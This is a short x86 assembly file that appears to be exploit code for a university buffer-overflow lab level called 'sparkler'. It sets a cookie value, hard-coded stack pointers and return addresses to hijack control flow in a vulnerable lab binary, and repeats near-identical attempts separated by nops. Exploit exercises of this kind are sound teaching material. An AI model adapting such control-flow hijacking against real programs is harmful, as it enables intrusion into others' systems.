; nasm -f elf32 -g weichen_sparkler.asm -o weichen_sparkler.o
; ld -m elf_i386 weichen_sparkler.o -o weichen_sparkler.elf
section .data
section .text
global _start,stop
_start:
	mov dword [0x804d100],0x74dce902
	push 0x8048bc5
	nop
	nop
	nop
	mov ebp,0x55683000
    mov esp,0x55682fc8
    mov eax,0x74dce902 
    push 0x080490ae
	nop
	nop
	nop
	mov ebp,0x55683030
	mov esp,0x55683004
	mov dword [0x55683004],0x8048cd6	
	mov esi,0x556865c0
	mov eax,0x74dce902
	mov dword [0x55683008],0x556865c0
	nop 
	nop 
	nop
	mov eax,0x74dce902
	mov ebp,0x55683030
	push 0x8048cd6
	nop
	nop
	mov eax,esp
	mov ebp,0x55683030
	push 0x8048cd6
	mov eax,1
	mov ebx,0
	int 0x80

stop:
	mov eax,10
	ret